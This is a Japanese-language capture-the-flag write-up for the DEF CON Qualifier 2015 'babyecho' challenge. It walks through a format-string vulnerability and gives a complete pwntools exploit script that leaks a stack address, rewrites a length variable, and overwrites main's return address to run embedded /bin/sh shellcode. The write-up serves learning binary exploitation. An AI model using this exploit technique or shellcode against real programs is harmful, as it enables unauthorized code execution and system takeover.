---
layout: post
redirect_from:
  - /blog/2016/01/08/defcon-qualifier-ctf-2015-babyecho/
date: 2016-01-08T02:18:11+09:00
tags: [ "ctf", "pwn", "writeup", "format-string-attack", "shellcode" ]
---

# DEF CON Qualifier 2015: babyecho

## [Baby's First 1: babyecho](https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/babyecho)

>   babyecho\_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me:3232  
>   [Download]()

format文字列攻撃の脆弱性のあるバイナリ。

``` sh
$ ./babyecho
Reading 13 bytes
%p
0xd
Reading 13 bytes
%10d%hhn
zsh: segmentation fault (core dumped)  ./babyecho
```

全て読むにはつらい大きなバイナリであるが、セキュリティ機構はほとんど存在していない。
libcを静的にlinkしているようである。
`%n`を入力すると`_n`が返ってくることなどから分かるが、libcの関数そのものではなく多少手が入れられている。

``` sh
$ ll babyecho
-rwxr-x--x 1 user user 664936 Jan  7 23:50 babyecho
$ ldd babyecho
    not a dynamic executable
$ checksec --file babyecho
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   babyecho
```

中を覗くと、main関数は以下のようなものと考えてよいと分かる。

``` c
int main(void) {
    char buf[1024];
    int flag = 0;
    char *p = buf;
    int len = 13;
    while (flag == 0) {
        assert (len <= 1024);
        printf("Reading %d bytes\n", len);
        fgets(stdin, buf, len);
        printf(buf);
        putchar('\n');
    }
    return 0;
}
```

攻撃の手順は以下のようになる。

-   `p`を表示し`esp`を得る。
-   `len`を書き換え長い文字列を送り込めるようにする。
-   `buf`にshellcodeを載せ、`main`の戻りアドレスをshellcodeへのポインタで書き換え、`flag`を書き換える。

これを実行するコードは以下のようになる。

``` python
#!/usr/bin/env python2
from pwn import * # https://github.com/Gallopsled/pwntools/tree/2.2/pwnlib

context.log_level = 'debug'
p = remote('localhost', 8022)
# p = process('./babyecho')

# ebp of main
# ret from printf
# buf        # esp
# 0xd        # esp + 0x4, $1
# 0xa        # esp + 0x8, $2
# 0x0        # esp + 0xc, $3
# 0xd        # esp + 0x10, $4, len of buf
# 0xffbd510c # esp + 0x14, $5, ptr to buf
# 0x0        # esp + 0x18, $6, break flag
# buf        # esp + 0x1c, $7
# ret        # esp + 0x42c, ret addr from main

p.recvline_regex('Reading \d+ bytes\n') # 13 bytes
p.sendline('%5$p')
buf = int(p.recvline(keepends=False), 16)
esp = buf - 0x1c

p.recvline_regex('Reading \d+ bytes\n') # 13 bytes
p.sendline(p32(esp + 0x10) + '%99d' + '%7$n')

p.recvline_regex('.*Reading \d+ bytes\n') # 103 bytes
p.sendline(p32(esp + 0x10) + '%999d' + '%7$n')

# http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
p.recvline_regex('.*Reading \d+ bytes\n') # 1003 bytes

payload = ''
payload += p32(esp + 0x18) # $7
payload += p32(esp + 0x42c) # $8
payload += p32(esp + 0x42c + 1) # $9
payload += p32(esp + 0x42c + 2) # $10
payload += p32(esp + 0x42c + 3) # $11
ptr = esp + 0x1c + len(payload)
payload += shellcode
initial_len = len(payload)
payload += '%7$hhn'
payload += ('%%%dd' % ((ord(p32(ptr)[0]) -      initial_len) % 0x100 + 0x100)) + '%8$hhn'
payload += ('%%%dd' % ((ord(p32(ptr)[1]) - ord(p32(ptr)[0])) % 0x100 + 0x100)) + '%9$hhn'
payload += ('%%%dd' % ((ord(p32(ptr)[2]) - ord(p32(ptr)[1])) % 0x100 + 0x100)) + '%10$hhn'
payload += ('%%%dd' % ((ord(p32(ptr)[3]) - ord(p32(ptr)[2])) % 0x100 + 0x100)) + '%11$hhn'
p.sendline(payload)

p.sendline('ls')
p.interactive()
```
